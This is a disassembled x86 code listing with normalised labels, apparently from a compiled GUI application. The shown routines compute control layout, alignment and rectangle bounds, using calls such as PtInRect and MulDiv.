mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44f7d4
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44f8c0
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403300
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44f8f4
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44f914
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403370
test al al
je r-xdata
mov eax edi
call sub_44f954
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44f980
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44f9ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406a9c
mov eax esp
call sub_416ca0
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44d178
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403370
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403370
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_44d1a4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_416ca0
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416c28
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44d14c
sub_44fad4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44fb14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c378
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44fb48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44fc40
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44c734
push ebx
push sub_4515d8
call sub_421a58
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424068
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424210
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4034c0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bb3c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f40
lea eax [ ebx + 0x188 ]
call sub_403eec
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc47
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_44fc47
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_44fc6c
push ebx
push esi
push edi
call sub_403528
mov ebx edx
mov edi eax
mov eax edi
call sub_420c68
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405758
mov eax [ edi + 0x178 ]
call sub_403174
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_44b2e0
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_45090c
mov eax edi
call sub_450b4c
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403174
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_450b10
mov esi eax
mov edx esi
mov eax edi
call sub_450978
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_450b4c
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44c80c
test bl bl
jle r-xdata
call sub_421af0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403510
sub_44fd3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44fe00
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4184a0
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_453fdc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4182a8
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4183f4
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4182a8
test eax eax
je r-xdata
sub_44fe10
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor eax eax
push ebp
push sub_44fe50
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ca70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe57
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
sub_44fe57
mov eax [ ebp - 0x4 ]
call sub_44fd3c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451510
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44e7e8
sub_44fe8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44fea7 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44ff18
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_454120
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416c28
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_450299
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4502a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_4501ae ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_450111
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4502a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4502cf ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_450358
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_450b4c
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41814c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4182a8
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44ff18
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_450b10
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_418324
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4182a8
mov edx eax
mov ecx ebx
mov eax edi
call sub_44fe8c
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_4504c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_450b4c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_450b10
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_450b10
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45051c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_4504c8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4505fb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_450358
pop ecx
push ebp
mov al 0x2
call sub_450358
pop ecx
push ebp
mov al 0x3
call sub_450358
pop ecx
push ebp
mov al 0x4
call sub_450358
pop ecx
push ebp
mov al 0x5
call sub_450358
pop ecx
push ebp
mov al 0x6
call sub_450358
pop ecx
push ebp
xor eax eax
call sub_450358
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403370
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_450620
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor eax eax
push ebp
push sub_4506a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_4506e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4507a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d038
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507b0
mov eax [ ebp - 0xc ]
call sub_403174
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41814c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44cda4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4182a8
xor ecx ecx
mov edx 0xb03e
call sub_44e7e8
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_4507b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450b4c
test eax eax
je r-xdata
pop edi
pop esi
